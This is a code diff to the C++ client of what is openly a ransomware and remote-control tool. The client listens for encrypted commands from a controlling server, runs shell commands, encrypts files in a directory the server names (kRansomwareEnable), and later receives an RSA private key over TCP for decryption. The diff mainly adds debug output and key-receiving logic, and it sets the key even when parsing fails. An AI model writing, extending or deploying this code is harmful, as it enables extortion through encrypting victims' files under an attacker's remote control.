@@ -1,6 +1,7 @@
 #include "Client.h"
 #include "NetworkManager.h"
 #include "Syscalls.h"
+#include "openssl/err.h"
 
 #define ADD_TO_STARTUP TRUE
 
@@ -208,19 +209,48 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
     std::string cmdOutput = "";
 
     switch ( command.action ) {
-    case Action::kSetAsDecryptionKey:
-        const unsigned char* der = reinterpret_cast<const unsigned char* >( command.buffer );
+    case Action::kSetAsDecryptionKey: {
+        int len = 0;
 
-        RSA* key = d2i_RSAPrivateKey(nullptr, &der, command.buffLen);
-        if ( !key ) {
+        std::cout << "Setting decryption key." << std::endl;
+
+        int received = Receive(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
+        if ( received <= 0 ) {
             success = FALSE;
             break;
         }
 
+        std::cout << "Received length of DER formatted key : " << len << std::endl;
+
+        unsigned char* der = ( unsigned char* ) malloc(len);
+        received = Receive(this->m_TCPSocket, ( char* ) der, len, 0);
+        if ( received <= 0 ) {
+            success = FALSE;
+            free(der);
+            break;
+        }
+
+        std::cout << "Received DER formatted key : " << der << std::endl;
+
+        const unsigned char* constDer = der;
+
+        std::cout << "Converting into key" << std::endl;
+
+        RSA* key = d2i_RSAPrivateKey(nullptr, &constDer, len);
+        if ( !key ) {
+            std::cout << "Failed?" << std::endl;
+            char errBuffer[256];
+            ERR_error_string_n(ERR_get_error(), errBuffer, sizeof(errBuffer)); // Convert to readable string
+            std::cout << errBuffer << std::endl;
+        }
+
         this->m_FileManager.SetPrivateKey(key);
+        //CLIENT_DBG("Set decryption key")
+        std::cout << "Set key" << std::endl;
 
         success = TRUE;
         break;
+    }
     case Action::kRunDecryptor:
         // its still called even if we havent received the private key from the server 
         // wont decrypt anything though because we dont have the private key
@@ -228,6 +258,8 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         success = TRUE;
         break;
     case Action::kRansomwareEnable:
+        CLIENT_DBG("run ransomware in directory");
+        CLIENT_DBG(command.buffer);
         this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
         success = TRUE;
         break;
@@ -263,6 +295,9 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
             cmdOutput
         );
         
+        break;
+    default:
+        success = TRUE;
         break;
     }
 
@@ -300,6 +335,8 @@ void Client::ListenForServerCommands() {
             continue;
         }
 
+        CLIENT_DBG("received");
+
         Packet receivedPacket = LGCrypto::DecryptToStruct<Packet>(encrypted, this->m_AESKey);
         
         if ( receivedPacket.action == kKeepAlive ) {
@@ -312,8 +349,11 @@ void Client::ListenForServerCommands() {
         }
 
         Packet responseToServer;
-        if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
+        if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
+            CLIENT_DBG("running command");
+            CLIENT_DBG(std::string(std::to_string(receivedPacket.action)).c_str());
             PerformCommand(receivedPacket, responseToServer);
+        }
 
         // dont need to respond to server with 'responseToServer'
         if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
